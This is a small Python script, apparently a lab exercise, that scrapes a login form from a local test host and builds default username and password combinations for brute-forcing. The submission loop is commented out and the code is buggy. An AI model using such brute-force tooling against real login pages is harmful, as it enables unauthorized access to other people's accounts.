from bs4 import BeautifulSoup
import requests


url='http://192.168.64.2/red.php'
res=requests.get(url)
doc=BeautifulSoup(res.text,'lxml')



form_tags=doc.find('form')
action_link=form_tags.get('action')
method=form_tags.get('method')

print(method)

params=[]
for var in form_tags.find_all('input'):
	try:
		params.append(var['name'])
	except:
		pass

values=[
'admin',
'admin',
'admin',
'admin121',
'password',
'admin',
'user',
'userpass',
'userpasst'
]

dic={}
dic_data=[]
count=0
for i in range(len(values)):
	count+=1
	dic[params[i%len(params)]]=values[i]
	print(dic,'\n\n')
	dic_data.append(dic)


print(f'[!] Detected New Form at {action_link}\n[~] Expected Method : {method}\n[~] Expected params : {params}\n[~] Starting Bruteforcing...')

print(dic_data)

# try:
# 	for data in dic_data:
# 		print(data)
# 		if method=='post':
# 			res=requests.post(url+action_link,data=data)
# 		if method=='get':
# 			s = requests.Session()
# 			s.proxies = {'http' : 'localhost:8080', 'https' : 'localhost:8080'}
# 			res = s.get(url+action_link,params=data, verify=False)
# 		if method=='put':
# 			res=requests.put(url+action_link,data=data,proxies=proxy)
# 		print(res.url,res.status_code)
# except:
# 	pass
